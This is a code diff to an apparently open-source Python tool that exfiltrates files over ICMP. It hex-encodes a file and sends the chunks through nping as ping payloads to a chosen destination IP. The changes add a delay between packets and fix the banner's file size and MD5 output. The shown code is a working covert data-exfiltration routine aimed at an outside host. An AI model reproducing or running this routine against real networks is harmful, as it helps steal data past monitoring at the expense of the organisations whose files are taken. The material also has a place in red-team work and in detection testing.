@@ -16,9 +16,7 @@ nping = ''
 exfilhash = ''
 # https://raw.githubusercontent.com/todb/junkdrawer/master/exfiltrate-data.rb
 # https://community.rapid7.com/community/metasploit/blog/2014/01/01/fun-with-icmp-exfiltration
-#TODO Add time between packets
-#TODO Add file size in output (Before and after compression)
-
+#TODO Add size for payload
 def signal_handler(signal, frame):
         Completed(True)
         sys.exit(0)
@@ -69,7 +67,7 @@ def exfildata(ipaddress, file, compress, npinglocation, chunksize):
     for i in range(len(hex_string)):
         chunk = hex_string[x:chunksize + x]
         if chunk:
-            subprocess.call(npinglocation + ' ' + ipaddress + ' --icmp -H --quiet -c 1 -data ' + chunk, stdout=None)
+            subprocess.call(npinglocation + ' ' + ipaddress + ' --icmp -H --quiet -c 1 --delay 10ms -data ' + chunk, stdout=None)
             print('| Chunks remaining: ' + str(chunks).ljust(55) + '|\r', end="")
             chunks -= 1
             x += chunksize
@@ -145,14 +143,14 @@ def Header(ipaddress, file, compress, chunksize):
     print('| Date Run: ' + str(datetime.datetime.now()).ljust(63) + '|')
     print('+--------------------------------------------------------------------------+')
     print('| Destination IP: ' + str(ipaddress).ljust(57) + '|')
-        print('+--------------------------------------------------------------------------+')
+    print('+--------------------------------------------------------------------------+')
     print('| Source File     : ' + str(file).ljust(55) + '|')
-    print('| Source File Size: ' + str(file).ljust(55) + '|')
-    print('| Source File MD5 : ' + str(os.stat(file).st_size).ljust(55) + '|')
+    print('| Source File Size: ' + str(os.stat(file).st_size).ljust(55) + '|')
+    print('| Source File MD5 : ' + str(genMD5(file)).ljust(55) + '|')
     if compress:
-        print('| Compression:      Enabled.                                               |')
+        print('| Compression     : Enabled                                                |')
     if chunksize >= 1:
-        print('| Compression:      Disabled.                                              |')
+        print('| Compression     : Disabled                                               |')
         print('| Size of chunk: ' + str(chunksize).ljust(58) + '|')
     print('+--------------------------------------------------------------------------+')
 
@@ -163,6 +161,9 @@ def Completed(cancel):
     else:
         print('+--------------------------------------------------------------------------+')
         print('| Transferred file MD5: ' + str(exfilhash).ljust(51) + '|')
+        print('| Transferred file MD5: ' + str(exfilhash).ljust(51) + '|')
+    
+    print('+--------------------------------------------------------------------------+')
     print('| [*] Completed.                                                           |')
     print('+--------------------------------------------------------------------------+')
 
@@ -234,6 +235,5 @@ def main(argv):
 
 
 main(sys.argv[1:])
-
 
 
